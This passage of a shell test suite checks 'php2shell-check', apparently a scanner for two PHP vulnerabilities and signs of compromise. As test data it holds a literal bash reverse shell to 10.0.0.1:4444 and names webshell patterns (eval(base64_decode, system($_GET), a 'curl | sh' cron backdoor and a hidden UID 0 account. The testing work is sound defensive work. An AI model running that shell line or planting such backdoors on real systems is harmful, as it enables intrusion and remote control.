    eq "unit: sapi_of_path php-8.3 (OpenBSD name) -> cli" "$(uget SPP /usr/local/bin/php-8.3 3)" cli
    eq "unit: clean() removes ESC, DEL and other control characters" "$(uget CL ctrl 3)" 0
    eq "unit: redact_cmd hides --password=VALUE" "$(uget RD mysqldump 3)" 'sh -c mysqldump --user=forge --password=*** forge_db'
    eq "unit: redact_cmd hides the value after --token" "$(uget RD separate 3)" 'tool --token *** -x'
    eq "unit: redact_cmd hides URL credentials" "$(uget RD url 3)" 'curl https://***@example.invalid/x'
    eq "unit: redact_cmd hides mysql -pPASSWORD" "$(uget RD mysql-p 3)" 'mysql -uroot -p*** db'
    eq "unit: redact_cmd keeps find -print" "$(uget RD find-print 3)" 'find / -print'
    eq "unit: redact_cmd keeps a reverse shell readable" "$(uget RD plain 3)" 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
    eq "unit: log_family error.log.1" "$(uget LF /var/log/apache2/error.log.1 3)" /var/log/apache2/error.log
    eq "unit: log_family error.log.2.gz" "$(uget LF /var/log/apache2/error.log.2.gz 3)" /var/log/apache2/error.log
    eq "unit: log_family error_log-20261020" "$(uget LF /var/log/httpd/error_log-20261020 3)" /var/log/httpd/error_log
    eq "unit: log_family keeps php8.2-fpm.log" "$(uget LF /var/log/php8.2-fpm.log 3)" /var/log/php8.2-fpm.log
    eq "unit: date_minus 2026-10-20 14 days" "$(uget DM 2026-10-20 3)" 2026-10-06
    eq "unit: date_minus across a leap day" "$(uget DM 2024-03-01 3)" 2024-02-29
    eq "unit: trunc does not cut a UTF-8 character in half" "$(uget TR euro 3)" 61620a
    eq "unit: trunc keeps a short line whole" "$(uget TR short 3)" 6162e282ac0a
    eq "unit: webroots_for keeps a nested root on another device (its own volume)" "$(uget WR split 3)" '/var/www,/var/www/html,'
    eq "unit: webroots_for merges a nested root on the same device" "$(uget WR same 3)" '/var/www,'
}

# ------------------------------------------------------ integration tests --

# Generic checks for every JSON report (docs/SPEC.md section 6).
SCHEMA='
def oneof(a): . as $x | a | any(. == $x);
def isstr: type == "string";
def isnum: type == "number";
def isbool: type == "boolean";
(.tool == "php2shell-check") and (.checker == "sh") and (.tool_version | isstr)
and (.data_version | isstr) and (.scanned_at | isstr)
and (.cves == ["CVE-2026-109618", "CVE-2026-109619"])
and (.host | type == "object") and (.host.is_root | isbool) and (.host.platform | isstr)
and (.summary.verdict | oneof(["VULNERABLE", "FIXED", "NO_PHP_FOUND", "INCOMPLETE"]))
and ([.summary.installations, .summary.vulnerable, .summary.fixed, .summary.unknown,
      .summary.restart_required, .summary.high_findings, .summary.review_findings,
      .summary.exit_code] | all(isnum))
and (.installations | type == "array") and (.findings | type == "array") and (.coverage | type == "array")
and (.installations | all(
      (.scope | isstr) and (.path | isstr) and (.sapi | isstr) and (.version | isstr) and (.branch | isstr)
      and (.branch_status | oneof(["supported", "eol", "prerelease", "newer", "unknown"]))
      and (.fixed_version | isstr) and (.patch_fingerprint | isbool)
      and (.package.manager | oneof(["dpkg", "rpm", "apk", "none"]))
      and (.package.name | isstr) and (.package.version | isstr) and (.package.origin | isstr)
      and (.evidence | oneof(["fingerprint", "version", "changelog", "vendor-data", "none"]))
      and (.verdict | oneof(["VULNERABLE", "FIXED", "UNKNOWN"]))
      and (.reason | isstr) and (.remediation | isstr) and (.exposure | isstr)
      and (.running | type == "object") and (.running.processes | isnum)
      and (.running.restart_required | isbool) and (.running | has("version") and has("verdict"))))
and (.findings | all(
      (.severity | oneof(["HIGH", "REVIEW", "INFO"])) and (.category | isstr) and (.title | isstr)
      and (.location | isstr) and (.count | isnum) and (.detail | isstr)))
and (.coverage | all(isstr))
'
SUMMARY_CONSISTENT='
(.summary.installations == (.installations | length))
and (.summary.high_findings == ([.findings[] | select(.severity == "HIGH")] | length))
and (.summary.review_findings == ([.findings[] | select(.severity == "REVIEW")] | length))
and (((.summary.exit_code % 2) == 1) == (.summary.verdict == "VULNERABLE"))
and ((((.summary.exit_code / 4) | floor) % 2 == 1) == (.summary.high_findings > 0))
and ((.summary.verdict == "VULNERABLE") == ((.summary.vulnerable + .summary.restart_required) > 0))
'

# run_scan NAME HOSTROOT PROC ARGS...: runs the scanner (cwd inside the
# fixture tree, so a stray relative write would be caught by the read-only
# check). Sets J (stdout file) and RC.
run_scan() {
    rs_name=$1 rs_hr=$2 rs_pr=$3
    shift 3
    J=$OUT/$SLUG/$rs_name.out
    mkdir -p "${J%/*}"
    RC=0
    # PHP2SHELL_NO_PS and PHP2SHELL_PS_FILE keep the no-/proc ps inventory and
    # ps fallback away from the real process table (RS_NO_PS=0 turns the
    # inventory back on); RS_PATH puts command shims first on PATH.
    # shellcheck disable=SC2086 # $SH may be "busybox sh"
    (cd "$FX" && PHP2SHELL_HOSTROOT=$rs_hr && PHP2SHELL_PROC=$rs_pr && PHP2SHELL_PS_FILE=${RS_PS_FILE:-$EMPTY_PS} &&
        PHP2SHELL_NO_PS=${RS_NO_PS:-1} && PATH=${RS_PATH:+$RS_PATH:}$PATH &&
        export PHP2SHELL_HOSTROOT PHP2SHELL_PROC PHP2SHELL_PS_FILE PHP2SHELL_NO_PS PATH &&
        $SH "$SCANNER" "$@") > "$J" 2> "$J.err" < /dev/null || RC=$?
    if [ "${TEST_VERBOSE:-0}" = 1 ] && [ -s "$J.err" ]; then
        sed "s|^|    [$rs_name stderr] |" "$J.err" | head -n 20
    fi
}
# run_json NAME HOSTROOT PROC ARGS...: run_scan with --json plus generic checks.
run_json() {
    rj_name=$1
    run_scan "$@" --json
    if jq -e 'type == "object"' "$J" >/dev/null 2>&1; then
        ok "$rj_name: valid JSON (exit $RC)"
    else
        nok "$rj_name: valid JSON" "exit $RC; stderr: $(head -n 3 "$J.err" | tr '\n' ' ' | cut -c1-200)"
        return 0
    fi
    if jq -e "$SCHEMA" "$J" >/dev/null 2>&1; then ok "$rj_name: report matches the SPEC section 6 schema"
    else nok "$rj_name: report matches the SPEC section 6 schema" \
        "$(jq -c '[.installations[] | {branch_status, evidence, verdict, running}] | .[0:3]' "$J" 2>/dev/null | cut -c1-300)"; fi
    ja "$rj_name: summary counts and verdict are consistent" "$SUMMARY_CONSISTENT"
    ja "$rj_name: summary.exit_code equals the exit status ($RC)" ".summary.exit_code == $RC" '.summary.exit_code'
    bit "$rj_name: not a usage error" "$RC" 64 0
}

PROC_ONLY_NONE='all(.installations[]; .running.processes == 0)'

scenario_A() {
    R=$FX/A/root; P=$FX/A/proc
    run_json A/host "$R" "$P"
    ja "A/host: data_version equals data/php2shell.json" ".data_version == \"$DATA_VERSION_JSON\"" '.data_version'
    ja "A/host: summary verdict VULNERABLE" '.summary.verdict == "VULNERABLE"'
    eq "A/host: exit code is 1+4 (+2 when non-root on Linux)" "$RC" $((1 + 4 + INC))
    # dpkg FPM below the fixed version
    ia "A/host: dpkg php-fpm8.2 found in scope host" /usr/sbin/php-fpm8.2 '.scope == "host"'
    ia "A/host: php-fpm8.2 VULNERABLE below-fixed-version" /usr/sbin/php-fpm8.2 '.verdict == "VULNERABLE" and (.reason | contains("below-fixed-version"))'
    ia "A/host: php-fpm8.2 version 8.2.20, branch 8.2 supported, fixed 8.2.35" /usr/sbin/php-fpm8.2 '.version == "8.2.20" and .branch == "8.2" and .branch_status == "supported" and .fixed_version == "8.2.35"'
    ia "A/host: php-fpm8.2 package dpkg php8.2-fpm 8.2.20-1~deb12u1" /usr/sbin/php-fpm8.2 '.package.manager == "dpkg" and .package.name == "php8.2-fpm" and .package.version == "8.2.20-1~deb12u1"'
    ia "A/host: php-fpm8.2 package origin debian" /usr/sbin/php-fpm8.2 '.package.origin == "debian"'
    ia "A/host: php-fpm8.2 no fingerprint" /usr/sbin/php-fpm8.2 '.patch_fingerprint == false'
    ia "A/host: php-fpm8.2 sapi fpm, exposure high" /usr/sbin/php-fpm8.2 '.sapi == "fpm" and .exposure == "high"'
    # running FPM group
    ia "A/host: php-fpm8.2 running with 3 processes" /usr/sbin/php-fpm8.2 '.running.processes == 3'
    ia "A/host: php-fpm8.2 no restart required" /usr/sbin/php-fpm8.2 '.running.restart_required == false'
    ia "A/host: php-fpm8.2 running version 8.2.20, VULNERABLE" /usr/sbin/php-fpm8.2 '.running.version == "8.2.20" and .running.verdict == "VULNERABLE"'
    # mod_php
    ia "A/host: libphp8.2.so sapi mod_php, exposure highest" /usr/lib/apache2/modules/libphp8.2.so '.sapi == "mod_php" and .exposure == "highest"'
    ia "A/host: libphp8.2.so mapped by 2 apache2 processes" /usr/lib/apache2/modules/libphp8.2.so '.running.processes == 2 and .running.restart_required == false'
    ia "A/host: libphp8.2.so VULNERABLE" /usr/lib/apache2/modules/libphp8.2.so '.verdict == "VULNERABLE"'
    ia "A/host: dpkg php-fpm8.2 reason has vendor-may-backport" /usr/sbin/php-fpm8.2 '(.reason | contains("vendor-may-backport"))'
    ia "A/host: unpackaged libphp8.2.so has no vendor-may-backport" /usr/lib/apache2/modules/libphp8.2.so '(.reason | contains("vendor-may-backport")) | not'
    # spaces in names, non-native files
    ia "A/host: '/opt/my php/bin/php' found (path with a space)" '/opt/my php/bin/php' '.version == "8.5.11" and .sapi == "cli" and .exposure == "low"'
    ia "A/host: '/opt/my php/bin/php' VULNERABLE below-fixed-version" '/opt/my php/bin/php' '.verdict == "VULNERABLE" and (.reason | contains("below-fixed-version"))'
    ja "A/host: shell-script wrapper /usr/local/bin/php is not a PHP build" 'all(.installations[]; .path != "/usr/local/bin/php")' '[.installations[].path]'
    ja "A/host: apache2 binary itself is not listed" 'all(.installations[]; .path != "/usr/sbin/apache2")' '[.installations[].path]'
    ja "A/host: exactly 3 installations" '(.installations | length) == 3' '[.installations[].path]'
    # config context
    fa "A/host: INFO config: session.upload_progress Off from the FPM pool" '.severity == "INFO" and .category == "config" and (.title | test("upload.progress"; "i")) and (.title | contains("Off"))'
    fa "A/host: REVIEW config: nginx fastcgi_param PHP_VALUE auto_detect_line_endings" '.severity == "REVIEW" and .category == "config"'
    # logs
    fa "A/host: HIGH crash from FPM SIGSEGV log (none before the window)" '.severity == "HIGH" and .category == "crash" and (.location | contains("php8.2-fpm.log"))'
    fa "A/host: crash from Apache AH00052 in a log name with a space" '.category == "crash" and (.location | contains("site a-error.log"))'
    fa "A/host: Apache crash is REVIEW (a crash also happened before the window)" '.severity == "REVIEW" and .category == "crash" and (.location | contains("site a-error.log"))'
    fa "A/host: crash from kernel segfault in kern.log" '.category == "crash" and (.location | contains("kern.log"))'
    fa "A/host: REVIEW fpm-exit from 'exited with code 255'" '.severity == "REVIEW" and .category == "fpm-exit"'
    fa "A/host: HIGH oom for pre-script 'in Unknown on line 0'" '.severity == "HIGH" and .category == "oom" and (.location | contains("php_errors.log"))'
    fn "A/host: log not modified since the window is not read" '(.location | contains("error.log.1"))'
    # web roots
    fa "A/host: REVIEW webroot: changed PHP file under the nginx root" '.severity == "REVIEW" and .category == "webroot" and (.location | contains("/srv/app/public")) and (.detail | contains("new.php"))'
    fa "A/host: REVIEW webroot: changed PHP file under the Apache DocumentRoot with spaces" '.severity == "REVIEW" and .category == "webroot" and (.location | contains("/srv/site two/htdocs"))'
    fa "A/host: REVIEW webroot: PHP files changed under /var/www" '.severity == "REVIEW" and .category == "webroot" and (.location | contains("/var/www")) and (.detail | contains("index.php"))'
    fa "A/host: REVIEW webroot: PHP file in an uploads dir (old file)" '.severity == "REVIEW" and .category == "webroot" and (.detail | contains("legacy.php"))'
    fn "A/host: old PHP file outside uploads is not reported" '(.detail | contains("about-old.php"))'
    fa "A/host: HIGH webshell eval(base64_decode( in 'evil shell.php'" '.severity == "HIGH" and .category == "webshell" and (.detail | contains("evil shell.php"))'
    fa "A/host: HIGH webshell system(\$_GET in cmd.php" '.severity == "HIGH" and .category == "webshell" and (.detail | contains("cmd.php"))'
    fa "A/host: HIGH webroot: PHP code in favicon.ico" '.severity == "HIGH" and .category == "webroot" and (.detail | contains("favicon.ico"))'
    fa "A/host: HIGH webroot: PHP code in logo.png" '.severity == "HIGH" and .category == "webroot" and (.detail | contains("logo.png"))'
    fa "A/host: HIGH persistence: .user.ini auto_prepend_file changed in the window" '.severity == "HIGH" and .category == "persistence" and (.detail | contains("/var/www/html/.user.ini"))'
    fa "A/host: REVIEW persistence: old .htaccess auto_prepend_file" '.severity == "REVIEW" and .category == "persistence" and (.detail | contains("old/.htaccess"))'
    fn "A/host: Wordfence auto_prepend_file is not reported" '(.detail | contains("wf/.user.ini"))'
    # persistence
    fa "A/host: HIGH persistence: cron 'curl ... | sh'" '.severity == "HIGH" and .category == "persistence" and ((.title + " " + .detail + " " + .location) | test("cron"; "i"))'
    fn "A/host: benign old cron file is not HIGH" '.severity == "HIGH" and (.detail | contains("/etc/cron.d/php"))'
    fa "A/host: HIGH persistence: non-root UID 0 account" '.severity == "HIGH" and .category == "persistence" and ((.title + " " + .detail) | test("sysbak|UID ?0"; "i"))'
    # process tree (SPEC section 5)
    fa "A/host: HIGH process: reverse shell under a PHP worker" '.severity == "HIGH" and .category == "process"'
    # never print file contents (SPEC section 8)
    truth "A/host: report does not contain file contents (webshell payload)" sh -c '! grep -q -F "base64_decode(\$_POST" "$1"' sh "$J"
    truth "A/host: report does not contain secrets from files" sh -c '! grep -q -F "hunter2" "$1"' sh "$J"
    truth "A/host: report does not contain cron file contents" sh -c '! grep -q -F "http://x/a" "$1"' sh "$J"
    A_RC=$RC

    run_scan A/text "$R" "$P"
    eq "A/text: text report exits with the same code as --json" "$RC" "$A_RC"
    truth "A/text: text report is not empty and not JSON" sh -c '[ -s "$1" ] && ! head -n 1 "$1" | cut -c1 | grep -q "{"' sh "$J"
    truth "A/text: text report does not contain the webshell payload" sh -c '! grep -q -F "base64_decode(\$_POST" "$1"' sh "$J"

    run_json A/skip-ioc "$R" "$P" --skip-ioc
    ja "A/skip-ioc: only config and vendor findings" 'all(.findings[]; .category == "config" or .category == "vendor")' '[.findings[].category]'
    fa "A/skip-ioc: config findings are still reported" '.severity == "REVIEW" and .category == "config"'
    ja "A/skip-ioc: no HIGH findings" '.summary.high_findings == 0'
    eq "A/skip-ioc: exit code is 1 (+2 when non-root on Linux)" "$RC" $((1 + INC))
    ia "A/skip-ioc: php-fpm8.2 still VULNERABLE and running" /usr/sbin/php-fpm8.2 '.verdict == "VULNERABLE" and .running.processes == 3'

    run_json A/offline "" "$P" --root "$R"
    ja "A/offline: every installation has scope image" '(.installations | length) == 3 and all(.installations[]; .scope == "image")' '[.installations[] | {path, scope}]'
    ja "A/offline: coverage mentions offline mode" 'any(.coverage[]; test("offline"; "i"))' '.coverage'
    ja "A/offline: no process checks (PHP2SHELL_PROC ignored)" "$PROC_ONLY_NONE and all(.findings[]; .category != \"process\")" '[.installations[].running]'
    ia "A/offline: php-fpm8.2 VULNERABLE with dpkg package" /usr/sbin/php-fpm8.2 '.verdict == "VULNERABLE" and .package.name == "php8.2-fpm" and .package.origin == "debian"'
    ia "A/offline: '/opt/my php/bin/php' found" '/opt/my php/bin/php' '.verdict == "VULNERABLE"'
    fa "A/offline: HIGH webshell still found" '.severity == "HIGH" and .category == "webshell"'
    fa "A/offline: HIGH persistence (cron) still found" '.severity == "HIGH" and .category == "persistence"'
    fa "A/offline: HIGH crash from logs still found" '.severity == "HIGH" and .category == "crash"'
    bit "A/offline: exit bit 1 (vulnerable)" "$RC" 1 1
    bit "A/offline: exit bit 4 (high findings)" "$RC" 4 1
}

scenario_B() {
    R=$FX/B/root; P=$FX/B/proc
    run_json B/host "$R" "$P" --skip-ioc
    ia "B/host: deleted exe -> php-fpm8.3 restart_required" /usr/sbin/php-fpm8.3 '.running.restart_required == true and .running.processes == 2'
    ia "B/host: exe older than the on-disk file -> /usr/local/sbin/php-fpm restart_required" /usr/local/sbin/php-fpm '.running.restart_required == true and .running.processes == 2'
    ia "B/host: deleted libphp mapping -> restart_required, mod_php" /usr/lib/apache2/modules/libphp8.5.so '.running.restart_required == true and .sapi == "mod_php" and .exposure == "highest"'
    ia "B/host: on-disk php-fpm8.3 is FIXED by version" /usr/sbin/php-fpm8.3 '.verdict == "FIXED" and .evidence == "version"'
    ia "B/host: not-running php8.2 has no restart" /usr/bin/php8.2 '.running.processes == 0 and .running.restart_required == false and .verdict == "FIXED"'
    ja "B/host: summary verdict VULNERABLE (restart required)" '.summary.verdict == "VULNERABLE"'
    ja "B/host: summary restart_required is 3" '.summary.restart_required == 3'
    bit "B/host: exit bit 1 (vulnerable incl. restart)" "$RC" 1 1
    bit "B/host: exit bit 4 clear" "$RC" 4 0
}

scenario_C() {
    R=$FX/C/root
    for c_mode in host offline; do
        if [ "$c_mode" = host ]; then run_json C/host "$R" "$NOPROC" --skip-ioc; c_scope=host
        else run_json C/offline "" "$NOPROC" --root "$R" --skip-ioc; c_scope=image; fi
        ia "C/$c_mode: ubuntu php8.1 with CVE in changelog -> FIXED changelog" /usr/bin/php8.1 ".verdict == \"FIXED\" and .evidence == \"changelog\" and .scope == \"$c_scope\""
        ia "C/$c_mode: php8.1 package php8.1-cli 8.1.2-1ubuntu2.20 origin ubuntu" /usr/bin/php8.1 '.package.manager == "dpkg" and .package.name == "php8.1-cli" and .package.version == "8.1.2-1ubuntu2.20" and .package.origin == "ubuntu"'
        ia "C/$c_mode: php8.1 version string keeps the vendor suffix" /usr/bin/php8.1 '.version == "8.1.2-1ubuntu2.20" and .branch == "8.1" and .branch_status == "eol"'
        ia "C/$c_mode: ubuntu php-fpm8.1 without CVE in changelog -> VULNERABLE eol" /usr/sbin/php-fpm8.1 '.verdict == "VULNERABLE" and (.reason | contains("eol-no-upstream-fix"))'
        ia "C/$c_mode: php-fpm8.1 reason has vendor-may-backport" /usr/sbin/php-fpm8.1 '(.reason | contains("vendor-may-backport"))'
        ia "C/$c_mode: php-cgi8.1 with no changelog -> VULNERABLE, vendor-may-backport" /usr/bin/php-cgi8.1 '.verdict == "VULNERABLE" and (.reason | contains("vendor-may-backport")) and .sapi == "cgi" and .exposure == "elevated"'
        ia "C/$c_mode: fingerprinted 8.1.34 -> FIXED fingerprint" /usr/local/bin/php '.verdict == "FIXED" and .evidence == "fingerprint" and .patch_fingerprint == true and .version == "8.1.34"'
        ja "C/$c_mode: summary verdict VULNERABLE" '.summary.verdict == "VULNERABLE" and .summary.vulnerable == 2 and .summary.fixed == 2'
        bit "C/$c_mode: exit bit 1" "$RC" 1 1
    done
}

scenario_D() {
    R=$FX/D/root
    for d_mode in host offline; do
        if [ "$d_mode" = host ]; then run_json D/host "$R" "$NOPROC" --skip-ioc
        else run_json D/offline "" "$NOPROC" --root "$R" --skip-ioc; fi
        ia "D/$d_mode: apk php-fpm83 VULNERABLE below-fixed-version" /usr/sbin/php-fpm83 '.verdict == "VULNERABLE" and (.reason | contains("below-fixed-version"))'
        ia "D/$d_mode: php-fpm83 package apk php83-fpm 8.3.12-r0" /usr/sbin/php-fpm83 '.package.manager == "apk" and .package.name == "php83-fpm" and .package.version == "8.3.12-r0"'
        ia "D/$d_mode: php-fpm83 package origin alpine" /usr/sbin/php-fpm83 '.package.origin == "alpine"'
        ia "D/$d_mode: apk-packaged php-fpm83 reason has vendor-may-backport (package present)" /usr/sbin/php-fpm83 '(.reason | contains("vendor-may-backport"))'
        ia "D/$d_mode: unpackaged 8.6.0RC3 build has no vendor-may-backport" /usr/local/bin/php '(.reason | contains("vendor-may-backport")) | not'
        ia "D/$d_mode: apk php83 (second stanza) owns /usr/bin/php83" /usr/bin/php83 '.package.manager == "apk" and .package.name == "php83" and .sapi == "cli"'
        ia "D/$d_mode: 8.6.0RC3 -> VULNERABLE prerelease-unpatched" /usr/local/bin/php '.verdict == "VULNERABLE" and (.reason | contains("prerelease-unpatched")) and .branch_status == "prerelease"'
        ia "D/$d_mode: 8.6.0RC3 with fingerprint -> FIXED" /usr/local/bin/php-cgi '.verdict == "FIXED" and .evidence == "fingerprint"'
        bit "D/$d_mode: exit bit 1" "$RC" 1 1
    done
}

scenario_E() {
    R=$FX/E/root; P=$FX/E/proc
    run_json E/host "$R" "$P" --skip-ioc
    ja "E/host: container installation scope container:$CTR_SHORT" "any(.installations[]; .scope == \"container:$CTR_SHORT\")" '[.installations[] | {scope, path}]'
    ia "E/host: container php-fpm found inside the container rootfs" /usr/local/sbin/php-fpm ".scope == \"container:$CTR_SHORT\" and .version == \"8.4.26\""
    ia "E/host: container php-fpm VULNERABLE, sapi fpm, exposure high" /usr/local/sbin/php-fpm '.verdict == "VULNERABLE" and .sapi == "fpm" and .exposure == "high"'
    ia "E/host: container php-fpm running with 2 processes, no restart" /usr/local/sbin/php-fpm '.running.processes == 2 and .running.restart_required == false'
    ja "E/host: no host-scope installations (host has no PHP)" 'all(.installations[]; .scope != "host")' '[.installations[] | {scope, path}]'
    ja "E/host: summary verdict VULNERABLE" '.summary.verdict == "VULNERABLE"'
    bit "E/host: exit bit 1" "$RC" 1 1
}

# utf8_valid FILE: true when FILE is valid UTF-8 (byte-level check).
utf8_valid() {
    LC_ALL=C awk 'BEGIN { for (i = 1; i < 256; i++) O[sprintf("%c", i)] = i; bad = 0 }
        {
            s = $0; n = length(s); i = 1
            while (i <= n) {
                c = O[substr(s, i, 1)]
                if (c < 128) { i++; continue }
                k = (c >= 194 && c <= 223) ? 1 : ((c >= 224 && c <= 239) ? 2 : ((c >= 240 && c <= 244) ? 3 : 0))
                if (k == 0 || i + k > n) { bad = 1; break }
                for (j = 1; j <= k; j++) { b = O[substr(s, i + j, 1)]; if (b < 128 || b > 191) bad = 1 }
                if (bad) break
                i += k + 1
            }
            if (bad) exit
        }
        END { exit bad }' "$1"
}
# no_esc FILE: true when FILE has no ESC or 8-bit CSI byte.
no_esc() { [ "$(tr -d -c '\033\233' < "$1" | wc -c | tr -d ' ')" = 0 ]; }
# next_steps FILE: the text report's "Next steps" lines.
next_steps() { sed -n '/^Next steps/,/^Exit code/p' "$1" | sed '1d;$d' | grep -v '^$'; }

scenario_F() {
    R=$FX/F/root
    run_json F/host "$R" "$NOPROC"
    ja "F/host: every installation FIXED" '(.installations | length) == 8 and all(.installations[]; .verdict == "FIXED")' '[.installations[] | {path, verdict}]'
    # No /proc: running code was never checked, so never "FIXED" (SPEC 1, 6).
    ja "F/host: summary INCOMPLETE without /proc (running processes not checked)" '.summary.verdict == "INCOMPLETE"'
    eq "F/host: exit code 2 without /proc" "$RC" $((NPI | INC))
    ja "F/host: coverage says running processes were not checked" 'any(.coverage[]; test("no /proc"))' '.coverage'
    ja "F/host: no HIGH or REVIEW findings" '.summary.high_findings == 0 and .summary.review_findings == 0' '[.findings[] | {severity, category, location}]'
    ia "F/host: 8.3.36 without fingerprint -> FIXED by version" /usr/bin/php8.3 '.evidence == "version" and .sapi == "cli" and .exposure == "low"'
    ia "F/host: php-fpm8.5 -> fpm/high, fingerprint" /usr/sbin/php-fpm8.5 '.evidence == "fingerprint" and .sapi == "fpm" and .exposure == "high"'
    ia "F/host: php-cgi8.4 -> cgi/elevated" /usr/bin/php-cgi8.4 '.sapi == "cgi" and .exposure == "elevated"'
    ia "F/host: phpdbg8.2 -> phpdbg/low" /usr/bin/phpdbg8.2 '.sapi == "phpdbg" and .exposure == "low"'
    ia "F/host: lsphp -> litespeed/elevated" /usr/local/bin/lsphp '.sapi == "litespeed" and .exposure == "elevated"'
    ia "F/host: frankenphp -> frankenphp/high" /usr/local/bin/frankenphp '.sapi == "frankenphp" and .exposure == "high"'
    ia "F/host: libphp8.4.so 8.4.26 + fingerprint -> FIXED fingerprint, mod_php" /usr/lib/apache2/modules/libphp8.4.so '.evidence == "fingerprint" and .sapi == "mod_php" and .exposure == "highest"'
    ia "F/host: Mach-O php-fpm under /opt is recognised" /opt/homebrew/opt/php/sbin/php-fpm '.version == "8.5.12" and .verdict == "FIXED"'
    ja "F/host: non-native files named php are ignored" 'all(.installations[]; .path != "/usr/local/bin/php" and .path != "/usr/sbin/php-fpm7.4")' '[.installations[].path]'
    run_scan F/text "$R" "$NOPROC"
    f_txt=$(cat "$J")
    has "F/text: says running processes were not checked instead of 'not running'" "$f_txt" 'running processes not checked (no /proc)'
    lacks "F/text: never says 'not running' when processes were not checked" "$f_txt" 'not running ·'
    lacks "F/text: never says 'Nothing to do' when processes were not checked" "$f_txt" 'Nothing to do'
    has "F/text: next steps say to restart PHP services" "$f_txt" 'Restart every PHP service'
    has "F/text: exit 2 next steps explain the limited coverage" "$f_txt" 'Coverage was limited'
    # ps fallback (no /proc): name the running PHP services.
    printf '  612 /usr/local/sbin/php-fpm\n  613 php-fpm\n  700 /usr/sbin/httpd\n    1 /sbin/launchd\n' > "$OUT/$SLUG/ps-php.txt"
    RS_PS_FILE=$OUT/$SLUG/ps-php.txt
    run_json F/ps "$R" "$NOPROC" --skip-ioc
    RS_PS_FILE=''
    ja "F/ps: coverage names the PHP processes ps can see" 'any(.coverage[]; contains("php-fpm x2") and contains("httpd x1"))' '.coverage'
    ja "F/ps: still INCOMPLETE" '.summary.verdict == "INCOMPLETE"'
    run_json F/offline "" "$NOPROC" --root "$R"
    ja "F/offline: every installation FIXED with scope image" '(.installations | length) == 8 and all(.installations[]; .verdict == "FIXED" and .scope == "image")' '[.installations[] | {path, verdict, scope}]'
    bit "F/offline: exit bit 1 clear" "$RC" 1 0
    bit "F/offline: exit bit 4 clear" "$RC" 4 0
    ja "F/offline: verdict INCOMPLETE exactly when exit bit 2 is set" "(.summary.verdict == \"INCOMPLETE\") == ((($RC / 2) | floor) % 2 == 1) and (.summary.verdict == \"FIXED\" or .summary.verdict == \"INCOMPLETE\")"
    # Duplicates are keyed on device and inode: an ls that reports the same
    # inode for every file (btrfs subvolumes, other partitions) hides nothing.
    mkdir -p "$T/shim"
    printf '#!/bin/sh\nif [ "$1" = -di ]; then shift; for f in "$@"; do printf "256 %%s\\n" "$f"; done; exit 0; fi\nexec /bin/ls "$@"\n' > "$T/shim/ls"
    chmod 755 "$T/shim/ls"
    RS_PATH=$T/shim
    run_json F/same-inode "" "$NOPROC" --root "$R" --skip-ioc
    RS_PATH=''
    ja "F/same-inode: every build still reported when inode numbers repeat" '(.installations | length) == 8' '[.installations[].path]'
}

scenario_G() {
    R=$FX/G/root
    run_json G/host "$R" "$NOPROC" --skip-ioc
    ia "G/host: 8.7.0-dev (master, unfixed) -> VULNERABLE prerelease-unpatched" /usr/local/bin/php '.verdict == "VULNERABLE" and (.reason | contains("prerelease-unpatched")) and .branch_status == "prerelease"'
    ja "G/host: summary verdict VULNERABLE" '.summary.verdict == "VULNERABLE" and .summary.vulnerable == 1 and .summary.unknown == 0'
    bit "G/host: exit bit 1" "$RC" 1 1
    bit "G/host: exit bit 4 clear" "$RC" 4 0
}

scenario_G2() {
    R=$FX/G2/root
    run_json G2/offline "" "$NOPROC" --root "$R" --skip-ioc
    ia "G2/offline: 9.0.0 -> UNKNOWN branch-newer-than-data" /usr/local/bin/php '.verdict == "UNKNOWN" and (.reason | contains("branch-newer-than-data")) and .branch_status == "newer"'
    ja "G2/offline: summary INCOMPLETE" '.summary.verdict == "INCOMPLETE" and .summary.unknown == 1'
    eq "G2/offline: exit code 2" "$RC" 2
    run_scan G2/text "" "$NOPROC" --root "$R" --skip-ioc
    g2_ns=$(next_steps "$J")
    truth "G2/text: exit 2 has a non-empty Next steps section" [ -n "$g2_ns" ]
    has "G2/text: next steps say how to check the UNKNOWN build" "$g2_ns" 'could not be classified'
}

scenario_H() {
    R=$FX/H/root
    run_json H/host "$R" "$NOPROC" --skip-ioc
    ja "H/host: no installations" '(.installations | length) == 0'
    ja "H/host: summary INCOMPLETE without /proc" '.summary.verdict == "INCOMPLETE"'
    eq "H/host: exit code 2 without /proc" "$RC" $((NPI | INC))
    ja "H/host: coverage suggests --deep (only standard locations searched)" 'any(.coverage[]; contains("--deep"))' '.coverage'
    run_json H/offline "" "$NOPROC" --root "$R" --skip-ioc
    ja "H/offline: NO_PHP_FOUND" '.summary.verdict == "NO_PHP_FOUND"'
    eq "H/offline: exit code 0" "$RC" 0
}

scenario_J() {
    R=$FX/J/root
    run_json J/offline "" "$NOPROC" --root "$R" --skip-ioc
    ia "J/offline: packed php-fpm without a version string -> UNKNOWN version-unreadable" /usr/local/sbin/php-fpm '.verdict == "UNKNOWN" and .evidence == "none" and (.reason | contains("version-unreadable")) and .sapi == "fpm"'
    ia "J/offline: php with only the fingerprint -> UNKNOWN (version unreadable)" /usr/bin/php '.verdict == "UNKNOWN" and .patch_fingerprint == true'
    ja "J/offline: php-fpm_exporter is not a PHP build" 'all(.installations[]; .path != "/usr/local/bin/php-fpm_exporter")' '[.installations[].path]'
    ja "J/offline: coverage names the unreadable version" 'any(.coverage[]; contains("could not be read from /usr/local/sbin/php-fpm"))' '.coverage'
    ja "J/offline: summary INCOMPLETE, never NO_PHP_FOUND" '.summary.verdict == "INCOMPLETE" and .summary.unknown == 2'
    bit "J/offline: exit bit 2" "$RC" 2 1
}

scenario_J2() {
    R=$FX/J2/root
    if [ "$(id -u)" = 0 ]; then
        printf 'SKIP [%s] J2: unreadable PHP build (root can read every file)\n' "$CUR"
        return 0
    fi
    run_json J2/offline "" "$NOPROC" --root "$R" --skip-ioc
    ja "J2/offline: coverage names the unreadable PHP build" 'any(.coverage[]; contains("PHP build not readable: /usr/local/bin/php8.4"))' '.coverage'
    ja "J2/offline: summary INCOMPLETE (not FIXED)" '.summary.verdict == "INCOMPLETE" and .summary.installations == 1'
    eq "J2/offline: exit code 2" "$RC" 2
}

scenario_K() {
    R=$FX/K/root; P=$FX/K/proc
    run_json K/host "$R" "$P" --skip-ioc
    ia "K/host: dpkg php-fpm7.4 on disk FIXED by changelog" /usr/sbin/php-fpm7.4 '.verdict == "FIXED" and .evidence == "changelog"'
    ia "K/host: processes older than the file need a restart" /usr/sbin/php-fpm7.4 '.running.processes == 2 and .running.restart_required == true'
